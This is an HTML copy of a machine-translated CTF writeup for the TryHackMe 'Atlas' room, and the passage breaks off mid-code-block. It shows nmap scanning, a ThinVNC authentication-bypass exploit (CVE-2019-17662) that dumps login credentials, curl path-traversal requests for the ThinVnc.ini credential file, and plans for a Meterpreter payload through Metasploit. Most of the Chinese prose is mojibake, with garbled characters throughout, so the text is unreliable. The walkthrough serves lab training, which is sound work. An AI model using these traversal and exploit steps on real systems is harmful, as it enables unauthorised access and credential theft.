<html>
<head>
<title>TryHackMe writeup: Atlas</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMeæŠ¥é“:Atlas</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/tryhackme-writeup-atlas-c3dff235d109?source=collection_archive---------0-----------------------#2022-05-06">https://infosecwriteups.com/tryhackme-writeup-atlas-c3dff235d109?source=collection_archive---------0-----------------------#2022-05-06</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="f2c6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><a class="ae kp" href="https://tryhackme.com/room/atlas" rel="noopener ugc nofollow" target="_blank">â€œMurilandOracleâ€(2021)</a>å‘è¡¨äº†ä¸€ä¸ªTryHackMeæ•™ç¨‹å®¤ï¼Œè®¨è®ºäº†ä¸€ä¸ªç®€å•çš„ThinVNCæ¼æ´ï¼Œä¸€ç‚¹åˆ©ç”¨å¼€å‘å’Œæµ‹è¯•ï¼Œä»¥åŠPrintNightmareæ¼æ´ã€‚åœ¨æˆ‘æ°¸æ— æ­¢å¢ƒçš„â€œæ‰“ç ´è§„åˆ™â€çš„è¿½æ±‚ä¸­ï¼Œè¿™ä¸ªæˆ¿é—´æ¯”MurilandOracleè®¡åˆ’çš„å¤šèŠ±äº†æˆ‘å¤§çº¦ä¸€å‘¨çš„æ—¶é—´æ¥å®Œæˆã€‚å°½ç®¡å¦‚æ­¤ï¼Œæ‰“æ‰«æˆ¿é—´è¿˜æ˜¯ä¸€æ¬¡æœ‰è¶£çš„ç»å†ã€‚è¿™ç¯‡æ–‡ç« å°†è¯¦ç»†ä»‹ç»æˆ‘æ˜¯å¦‚ä½•å®Œæˆæˆ¿é—´çš„ã€‚</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj kq"><img src="../Images/4128ff5fece61377681a48b513cf3798.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hvuog2pl0lQzIEk_DnHN9Q.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">åŸºç¡€å›¾ç‰‡:<a class="ae kp" href="https://www.amazon.com/Age-Selfishness-Morality-Financial-Crisis/dp/1419715984" rel="noopener ugc nofollow" target="_blank">åå®å®‰å’Œå¤å¾·æ¸©(2015) </a></figcaption></figure><h1 id="a256" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">ç¨‹åº</h1><p id="3300" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">åœ¨å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ç¼–è¾‘äº†æ”»å‡»ç®±ä¸Šçš„<code class="fe mj mk ml mm b">/etc/hosts</code>æ–‡ä»¶ï¼Œå¹¶æ·»åŠ äº†ä¸‹é¢ä¸€è¡Œ:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="3e3d" class="mr lh iu mm b gz ms mt l mu mv">&lt;target ip&gt; atlas.thm</span></pre><p id="78a4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘è¿™æ ·åšæ˜¯å› ä¸ºæˆ‘çŸ¥é“æˆ‘ä¸ä¼šä¸€æ¬¡å°±ç»“æŸè¿™ä¸ªæˆ¿é—´ï¼Œè€Œä¸”TryHackMe boot2rootæœºå™¨çš„IPåœ°å€ä¼šéšç€æ¯ä¸ªæ–°ä¼šè¯è€Œæ”¹å˜ã€‚æœ€å¥½è®°å½•ä¸€ä¸ªä¼ªåŸŸåï¼Œè€Œä¸æ˜¯åŠ¨æ€IPåœ°å€ï¼Œè¿™æ ·æ¯å½“æˆ‘å¯åŠ¨ç›®æ ‡è™šæ‹Ÿæœºæ—¶ï¼Œæˆ‘å°±å¯ä»¥ç”¨æ–°çš„ç›®æ ‡IPåœ°å€ç¼–è¾‘<code class="fe mj mk ml mm b">/etc/hosts</code>æ–‡ä»¶ã€‚</p><p id="d181" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç„¶åï¼Œæˆ‘ç‚¹å‡»ç¬¬ä¸€ä¸ªä»»åŠ¡å³ä¸Šè§’çš„ç»¿è‰²â€œå¯åŠ¨æœºå™¨â€æŒ‰é’®ï¼Œå¼€å§‹æ¢æµ‹æœºå™¨ã€‚</p><h2 id="8e18" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">ä¾¦å¯Ÿ</h2><p id="abe8" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">ä¸ºäº†â€œè®©çƒæ»šåŠ¨èµ·æ¥â€ï¼Œæˆ‘ä»å¯¹ç›®æ ‡æœºå™¨çš„<a class="ae kp" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> nmap (n.d.) </a>æ‰«æå¼€å§‹:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="123e" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.1.xml atlas.thm </strong>   <br/>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.<br/>Starting Nmap 7.92 (<a class="ae kp" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a>) at [redacted] EDT<br/>NSE: Loaded 155 scripts for scanning.<br/>NSE: Script Pre-scanning.<br/>Initiating NSE at [redacted]</span></pre><p id="f96e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ¿é—´é‡Œçš„äººæ³¨æ„åˆ°ç›®æ ‡æœºå™¨æ­£åœ¨è¿è¡ŒWindowsï¼Œå› æ­¤éœ€è¦ä½¿ç”¨<code class="fe mj mk ml mm b">-Pn</code>æ ‡å¿—æ¥å¿½ç•¥Windowsä¸å“åº”ICMPè¯·æ±‚çš„äº‹å®ï¼Œå¹¶ç»§ç»­å¯åŠ¨ç«¯å£æ‰«æã€‚<code class="fe mj mk ml mm b">-oX tcp_scan.1.xml</code>æ ‡å¿—æŒ‡ç¤ºnmapä»¥XMLæ ¼å¼å­˜å‚¨å…¶ç»“æœã€‚</p><p id="96b8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘å·²ç»ç”¨<code class="fe mj mk ml mm b">xsltproc</code>å®ç”¨ç¨‹åºå°†åŸå§‹çš„XMLè¾“å‡ºè½¬æ¢æˆå¯è¯»çš„HTMLæ ¼å¼:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="bd81" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ xsltproc tcp_scan.1.xml -o tcp_scan.html</strong></span></pre><p id="5a73" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å›¾1æ˜¾ç¤ºäº†<code class="fe mj mk ml mm b">xsltproc</code>è¾“å‡ºçš„æ‘˜å½•ï¼Œç‰¹åˆ«æ˜¯ç›®æ ‡ç³»ç»Ÿä¸Šå¼€æ”¾çš„ç«¯å£:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nh"><img src="../Images/a2d6544049316b8cc9a96b42bae65398.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1TOq6CmfAIJQ9X2b6BvKKw.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾1 </strong></figcaption></figure><p id="bc04" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æœ‰ä¸¤ä¸ªç«¯å£æ˜¯æ‰“å¼€çš„:ä¸€ä¸ªæ˜¯3389ä¸Šçš„TCPé©±åŠ¨æœåŠ¡ï¼Œå¦ä¸€ä¸ªæ˜¯8080ç«¯å£ä¸Šçš„TCPé©±åŠ¨æœåŠ¡ã€‚æ‰«æè¿˜ç¡®å®šæ“ä½œç³»ç»Ÿä¸ºâ€œav tech Room Alert 26W environmental monitorâ€ã€‚</p><p id="4cdd" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">æ³¨æ„ï¼Œ</strong>7680ä¸Šçš„æœåŠ¡å·²ç»è¢«<code class="fe mj mk ml mm b">tcpwrappped</code>åŒ–äº†ï¼Œè¿™æ„å‘³ç€æ— è®ºè¿è¡Œå®ƒçš„æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå¼•ç”¨<code class="fe mj mk ml mm b">/etc/hosts.allow</code>å’Œ<code class="fe mj mk ml mm b">/etc/hosts.deny</code>æ–‡ä»¶ï¼Œå¹¶æ ¹æ®å®ƒä»¬çš„é…ç½®æˆäºˆ(æˆ–æ‹’ç»)è®¿é—®æƒé™(<a class="ae kp" href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-security_guide-tcp_wrappers_and_xinetd-tcp_wrappers_configuration_files" rel="noopener ugc nofollow" target="_blank"> Red Hatå®¢æˆ·é—¨æˆ·ï¼Œn.d </a>)ã€‚è¿˜åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œ<code class="fe mj mk ml mm b">tcpwrapped</code>æœåŠ¡ä¸åŒäºé˜²ç«å¢™â€”â€”è¿™åœ¨<a class="ae kp" href="https://attrition.org/errata/charlatan/carolyn_meinel/www/tech-06.html" rel="noopener ugc nofollow" target="_blank">Attrition.org(c . a . 1998)</a>ä¸­æœ‰æ‰€è®¨è®ºã€‚</p><p id="1ddb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¯¹nmapç»“æœçš„è¿›ä¸€æ­¥æ£€æŸ¥æ˜¾ç¤ºäº†ç«¯å£3389å’Œ8080ä¸Šåˆ†åˆ«è¿è¡Œçš„æœåŠ¡ã€‚å‰è€…æ­£åœ¨è¿è¡Œè¿œç¨‹æ¡Œé¢åè®®æœåŠ¡(å¦‚Microsoftç»ˆç«¯æœåŠ¡æ¨ªå¹…æ‰€ç¤ºï¼›å¦è§<a class="ae kp" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol" rel="noopener ugc nofollow" target="_blank">æ¢ç­‰äººï¼Œ2021 </a>)ï¼Œè€Œåè€…æ­£åœ¨è¿è¡ŒThinVNCæœåŠ¡(<a class="ae kp" href="https://sourceforge.net/projects/thinvnc/" rel="noopener ugc nofollow" target="_blank"> Cybeleç­‰äººï¼Œn . d .</a>)â€”â€”å¦‚nmapç»“æœä¸­çš„ä»¥ä¸‹ç‰‡æ®µæ‰€ç¤º:<code class="fe mj mk ml mm b">[â€¦] ticate: Digest <strong class="jt iv">realm="ThinVNC"</strong>, qop="aut [â€¦]</code>ã€‚</p><p id="3532" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘å†³å®šä½¿ç”¨åä¸€ç§æœåŠ¡ä½œä¸ºåˆ‡å…¥ç‚¹ã€‚æˆ‘ç”¨æˆ‘çš„æ”»å‡»ç®±çš„ç½‘ç»œæµè§ˆå™¨è®¿é—®äº†æ‰˜ç®¡åœ¨<code class="fe mj mk ml mm b">atlas.thm:8080</code>ä¸Šçš„ç½‘ç»œæœåŠ¡ï¼Œå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯(å›¾2):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj ni"><img src="../Images/fae6557f4435db120fd1f997badc0765.png" data-original-src="https://miro.medium.com/v2/resize:fit:1034/format:webp/1*Lf1yd5aQjhNh-yDD-cJsfQ.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾2 </strong></figcaption></figure><p id="fa25" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘è¾“å…¥ç”¨æˆ·å/å¯†ç ç»„åˆ<code class="fe mj mk ml mm b">admin:admin</code>ï¼Œå®ƒå›å¤äº†åŒæ ·çš„ç™»å½•å¯¹è¯æ¡†ã€‚ç„¶åæˆ‘ç‚¹å‡»å–æ¶ˆï¼Œå¾—åˆ°ä¸€ä¸ªâ€œ401è®¿é—®è¢«æ‹’ç»â€çš„é”™è¯¯é¡µé¢ã€‚</p><p id="56f1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç„¶åï¼Œæˆ‘è¿è¡Œ<code class="fe mj mk ml mm b">searchsploit</code>æ¥è·å–åˆ©ç”¨ThinVNCæœåŠ¡ä¸­çš„æ¼æ´çš„æ½œåœ¨å€™é€‰äºº:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="7c46" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ searchsploit thinvnc</strong><br/>------------------- -------------------------------------------<br/>Exploit Title                         |  Path                                                                        ------------------- -------------------------------------------<br/>ThinVNC 1.0b1 - Authentication Bypass | windows/remote/47519.py                                                     <br/>---------------------------------------------------------------<br/>Shellcodes: No Results</span></pre><p id="4fb8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ‰‹å¤´æœ‰äº†æ¦‚å¿µè¯æ˜ï¼Œæˆ‘ç°åœ¨å¯ä»¥ç€æ‰‹å°†å…¶æ­¦å™¨åŒ–ã€‚</p><h2 id="1a7a" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">åˆå§‹è®¿é—®</h2><p id="644c" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated"><code class="fe mj mk ml mm b">searchsploit</code>å‘ç°çš„æ¦‚å¿µè¯æ˜æ˜¯ç”±<a class="ae kp" href="https://www.exploit-db.com/exploits/47519" rel="noopener ugc nofollow" target="_blank"> Tumamlapalli (2019) </a>è®¾è®¡çš„ã€‚æˆ‘å°†ä¸Šè¿°æ¦‚å¿µè¯æ˜å¤åˆ¶åˆ°æˆ‘çš„é¡¹ç›®ç›®å½•ä¸­ï¼Œç„¶åè¿è¡Œå®ƒï¼Œä»¥è·å¾—å¦‚ä½•ä½¿ç”¨å®ƒçš„â€œæ„Ÿè§‰â€:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="39ed" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ cp /usr/share/exploitdb/exploits/windows/remote/47519.py ./exploit1.py</strong><br/>                                                                                                                                    <br/><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/Documents/THM/ctf/atlas]<br/>â””â”€$ python3 exploit1.py</strong><br/>Usage:<br/>exploit1.py &lt;host&gt; &lt;port&gt;</span><span id="2e05" class="mr lh iu mm b gz nj mt l mu mv">Example:<br/>{} 192.168.0.10 5888</span></pre><p id="5ef8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¥½å§ã€‚çœ‹èµ·æ¥è¯¥æ¼æ´åˆ©ç”¨å°†ä¸»æœºåä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°†ç«¯å£ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚æˆ‘å°†å°è¯•åˆ†åˆ«ç”¨<code class="fe mj mk ml mm b">atlas.thm</code>å’Œ<code class="fe mj mk ml mm b">8080</code>è¿è¡Œå®ƒ:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="18e1" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ python3 exploit1.py atlas.thm 8080    </strong><br/>Traceback (most recent call last):<br/>  File "~/atlas/exploit1.py", line 39, in &lt;module&gt;<br/>    main()<br/>  File "~/atlas/exploit1.py", line 36, in main<br/>    exploit(host,port)<br/>  File "~atlas/exploit1.py", line 24, in exploit<br/>    print(body.splitlines()[2])<br/>IndexError: list index out of range</span></pre><p id="05c1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ˜¾ç„¶ï¼Œæœ‰äº›äº‹æƒ…ä¸å¯¹åŠ²ğŸ˜­ã€‚æ ¹æ®é”™è¯¯æ¶ˆæ¯åˆ¤æ–­ï¼Œé”™è¯¯çš„æ ¹æºåœ¨äºè„šæœ¬çš„<code class="fe mj mk ml mm b">exploit()</code>å‡½æ•°ï¼Œä¼¼ä¹æ˜¯ç”±äºè§£ææŸç§å­—ç¬¦ä¸²æ—¶å‡ºé”™ã€‚ä»¥ä¸‹æ˜¯æˆ‘è¯•å›¾è°ƒè¯•çš„æ¼æ´çš„ä¸€ä¸ªç‰‡æ®µ:</p><figure class="kr ks kt ku gu kv"><div class="bz fq l di"><div class="nk nl l"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">ThinVNCè®¤è¯æ—è·¯åˆ©ç”¨(<a class="ae kp" href="https://www.exploit-db.com/exploits/47519" rel="noopener ugc nofollow" target="_blank"> Tumamlapalliï¼Œ2019 </a>)</figcaption></figure><p id="e590" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">æ³¨æ„</strong>è¿™åªæ˜¯æºä»£ç çš„ä¸€ä¸ªç‰‡æ®µï¼Œæ‰€ä»¥æˆ‘çš„AttackBoxçš„ç»ˆç«¯è¾“å‡ºçš„é”™è¯¯æ¶ˆæ¯ä¸Šçš„è¡Œå·å¯èƒ½ä¸ç‰‡æ®µä¸­çš„è¡Œå·ä¸åŒ¹é…ã€‚</p><p id="d7f6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æŸ¥çœ‹è¯¥æ¼æ´çš„æºä»£ç ï¼ŒThinVNC (1.0b1)ä¼¼ä¹å­˜åœ¨ä¸€ä¸ªç›®å½•éå†æ¼æ´ï¼Œä½¿å¾—æ¶æ„é»‘å®¢èƒ½å¤Ÿè¯»å–å…³äºé«˜äºwebæœåŠ¡å™¨æ ¹ç›®å½•çš„ç›®å½•çš„<code class="fe mj mk ml mm b">.ini</code>æ–‡ä»¶ã€‚æˆ‘å°†å°è¯•æ‰‹åŠ¨åˆ©ç”¨è¿™ä¸ªä¸œè¥¿:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="54f9" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ curl atlas.thm:8080/xyz/../../ThinVnc.ini</strong><br/>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL ThinVnc.ini was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;<br/>                                                                                                                                    <br/><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ curl atlas.thm:8080/xyz/../ThinVnc.ini </strong><br/>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL ThinVnc.ini was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;<br/>                                                                                                                                    <br/><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ curl atlas.thm:8080/xyz/ThinVnc.ini </strong><br/>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL xyz/ThinVnc.ini was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span></pre><p id="2d0f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">åœ¨å°è¯•äº†å‡ åˆ†é’Ÿç±»ä¼¼çš„<code class="fe mj mk ml mm b">curl</code> GETè¯·æ±‚åï¼Œæˆ‘å†³å®šè¿›ä¸€æ­¥ç ”ç©¶è¿™ä¸ªæ¼æ´ã€‚çœ‹æ¥æ¦‚å¿µè¯æ˜è¢«ç ´åäº†ï¼Œç”±<a class="ae kp" href="https://github.com/MuirlandOracle/CVE-2019-17662" rel="noopener ugc nofollow" target="_blank">â€œmuri landoracleâ€(2021 b)</a>è®¾è®¡çš„æ›´å¯é çš„æ¦‚å¿µè¯æ˜å°†è¢«ç”¨äºè®¿é—®ç³»ç»Ÿã€‚æˆ‘å¼€å§‹å°†AGçš„æ¼æ´ä¸‹è½½åˆ°æˆ‘çš„æ”»å‡»ç®±ä¸­ï¼Œç„¶åå¯¹ç³»ç»Ÿè¿›è¡Œæµ‹è¯•:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="b029" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ python3 CVE-2019-17662.py atlas.thm 8080</strong></span><span id="b1ac" class="mr lh iu mm b gz nj mt l mu mv">     _____ _     _    __     ___   _  ____                                                                                          <br/>    |_   _| |__ (_)_ _\ \   / / \ | |/ ___|                                                                                         <br/>      | | | '_ \| | '_ \ \ / /|  \| | |                                                                                             <br/>      | | | | | | | | | \ V / | |\  | |___                                                                                          <br/>      |_| |_| |_|_|_| |_|\_/  |_| \_|\____|                                                                                         <br/>                                                                                                                                    <br/>                            @MuirlandOracle<br/>[+] Credentials Found!<br/>Username:       Atlas<br/>Password:       [redacted]</span></pre><p id="9dd6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆåŠŸäº†ï¼å¯¹äºæœ‰å…´è¶£å¯¹è¯¥æ¼æ´è¿›è¡Œæ›´å½»åº•çš„è¯„ä¼°å¹¶æ‰‹åŠ¨åˆ©ç”¨è¯¥æ¼æ´çš„äººï¼Œæˆ‘å°†åœ¨é™„å½•A.1ä¸­è¿›ä¸€æ­¥è®¨è®ºã€‚ä½†æœ‰äº†è¿™äº›å‡­æ®ï¼Œæˆ‘ç°åœ¨å¯ä»¥é€šè¿‡ThinVNCæœåŠ¡ç™»å½•ç³»ç»Ÿã€‚</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj nm"><img src="../Images/ba0712ccfc0159bd66460335853aa1b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1394/format:webp/1*mj93YJrz0W4lvrdlaOntFw.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾3 </strong></figcaption></figure><p id="4808" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘å°†ä½¿ç”¨å®ç”¨ç¨‹åº<a class="ae kp" href="https://remmina.org/" rel="noopener ugc nofollow" target="_blank"> Remmina (n.d.) </a>é€šè¿‡ThinVNCåè®®ç™»å½•åˆ°ç›®æ ‡ç³»ç»Ÿã€‚è¿è¡Œè¯¥å®ç”¨ç¨‹åºåï¼Œä¸»ç”¨æˆ·ç•Œé¢å‡ºç°(å›¾3)ã€‚äº‹æƒ…åº”è¯¥è®¾ç½®ä¸ºâ€œRDPâ€(å›¾3b)ï¼Œæˆ‘å°†é€šè¿‡ç‚¹å‡»å·¦ä¸Šè§’å¸¦æœ‰åŠ å·(â€œ+â€)å›¾æ ‡çš„æŒ‰é’®æ¥å¯åŠ¨ä¸€ä¸ªä¸´æ—¶è¿æ¥(å›¾3a)ã€‚</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nn"><img src="../Images/8ac8a9b74d3540b9525f57b48b55852c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o4YEgco0T3-YfPa65X3PqA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾4 </strong></figcaption></figure><p id="f79a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ‰“å¼€å¦ä¸€ä¸ªçª—å£(å›¾4 ),è¦æ±‚ç”¨æˆ·è¾“å…¥RDPè¿æ¥çš„é…ç½®ã€‚ç„¶åï¼Œæˆ‘è¾“å…¥æœåŠ¡å™¨(å›¾4a)ã€ç”¨æˆ·å(å›¾4b)å’Œå¯†ç (å›¾4c)ã€‚æˆ‘è¿˜å°†Remminaé…ç½®ä¸ºä½¿ç”¨è‡ªå®šä¹‰çš„<code class="fe mj mk ml mm b">1380x768</code>åˆ†è¾¨ç‡(å›¾4då’Œ4e)æ¥æ˜¾ç¤ºæ›´å¤§çš„å±å¹•ï¼Œå¹¶å¯ç”¨äº†â€œå…±äº«æ–‡ä»¶å¤¹â€åŠŸèƒ½ï¼Œè¿™å°†å…è®¸ç›®æ ‡ç³»ç»Ÿä»æˆ‘çš„æ”»å‡»ç®±ä¸­è®¿é—®æ–‡ä»¶ã€‚æœ€åï¼Œæˆ‘é€šè¿‡ç‚¹å‡»â€œè¿æ¥â€æŒ‰é’®è¿æ¥åˆ°ç›®æ ‡æœºå™¨çš„RDPæœåŠ¡(å›¾4g)ã€‚ä»¥ä¸‹çª—å£(å›¾5)æ˜¾ç¤ºäº†ç›®æ ‡æœºå™¨çš„RDPé©±åŠ¨ç•Œé¢:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj no"><img src="../Images/9a8ef85ed81053ee30f6b209c413c959.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*83lLFhGbBxbrE402Ht3l_g.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾5 </strong></figcaption></figure><h2 id="aba5" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">åå‰¥å‰Š</h2><p id="1582" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">å°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œæˆ‘æ›´å–œæ¬¢Meterpreterå¤–å£³(<a class="ae kp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank"> Metasploit Unleashedï¼Œn.d. </a>)ã€‚ä¸ºäº†å¾—åˆ°å®ƒï¼Œæˆ‘æœ€åˆå°è¯•Metasploitçš„<code class="fe mj mk ml mm b">web_delivery</code>æ¨¡å—é€šè¿‡PowerShellå’Œä¸€ä¸ª<code class="fe mj mk ml mm b">base64</code>ç¼–ç çš„æœ‰æ•ˆè½½è·æ¥äº¤ä»˜å®ƒâ€”â€”ä½†æ˜¯æœ‰æ•ˆè½½è·æ— æ³•æ‰§è¡Œã€‚å› æ­¤ï¼Œæˆ‘å¯»æ‰¾äº†ä¸€ç§æ›¿ä»£æ–¹æ³•ï¼Œé€šè¿‡HTAåº”ç”¨ç¨‹åº(<a class="ae kp" href="https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)" rel="noopener ugc nofollow" target="_blank"> Microsoft Docsï¼Œ2013 </a>)æ¥äº¤ä»˜å’Œæ‰§è¡Œæœ‰æ•ˆè½½è·ï¼Œè¿™æ˜¯ç”±<a class="ae kp" href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" rel="noopener ugc nofollow" target="_blank"> Chandel (2019) </a>è®¨è®ºçš„ã€‚åœ¨AttackBoxä¸Šï¼Œæˆ‘å¯åŠ¨äº†Metasploitï¼Œç„¶åé…ç½®å¹¶å¯åŠ¨äº†<code class="fe mj mk ml mm b">hta_server</code>æ¨¡å—:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="b007" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm 